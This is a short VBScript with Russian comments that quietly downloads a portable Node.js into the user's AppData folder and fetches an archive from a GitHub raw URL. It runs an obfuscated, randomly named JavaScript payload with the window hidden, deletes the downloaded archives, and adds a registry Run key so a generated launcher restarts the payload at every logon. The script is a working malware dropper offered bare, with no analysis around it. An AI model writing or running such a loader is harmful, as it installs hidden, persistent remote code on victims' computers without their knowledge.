Set objShell = CreateObject("Wscript.Shell")
Set objFSO   = CreateObject("Scripting.FileSystemObject")

appData   = objShell.ExpandEnvironmentStrings("%APPDATA%")
nodeZip   = appData & "\node.zip"
clientZip = appData & "\client.zip"
nodeDir   = appData & "\node-v22.19.0-win-x64"

' === Скачиваем Node.js ===
objShell.Run "cmd /c curl -L -o """ & nodeZip & """ https://nodejs.org/dist/v22.19.0/node-v22.19.0-win-x64.zip", 0, True

' === Распаковываем Node.js ===
objShell.Run "cmd /c tar -xf """ & nodeZip & """ -C """ & appData & """", 0, True

' === Скачиваем client.zip ===
objShell.Run "cmd /c curl -L -o """ & clientZip & """ https://raw.githubusercontent.com/DaleGelb/files/main/client.zip", 0, True

' === Распаковываем client.zip ===
objShell.Run "cmd /c tar -xf """ & clientZip & """ -C """ & nodeDir & """", 0, True

' === Удаляем архивы ===
If objFSO.FileExists(nodeZip) Then objFSO.DeleteFile nodeZip, True
If objFSO.FileExists(clientZip) Then objFSO.DeleteFile clientZip, True

' === Запускаем client-obf.js ===
objShell.Run """" & nodeDir & "\node.exe"" """ & nodeDir & "\awtnzzjjaqeuvbz.js""", 0, False

' === Создаём VBS для автозапуска ===
vbsFile = nodeDir & "\gahshccx.vbs"
Set f = objFSO.CreateTextFile(vbsFile, True)
f.WriteLine "Set sh = CreateObject(""Wscript.Shell"")"
f.WriteLine "sh.Run """ & nodeDir & "\node.exe"" """ & nodeDir & "\awtnzzjjaqeuvbz.js""", 0, False"
f.Close

' === Добавляем в автозагрузку запись на gahshccx.vbs ===
objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MyNodeStartup", "wscript.exe """ & vbsFile & """", "REG_SZ"








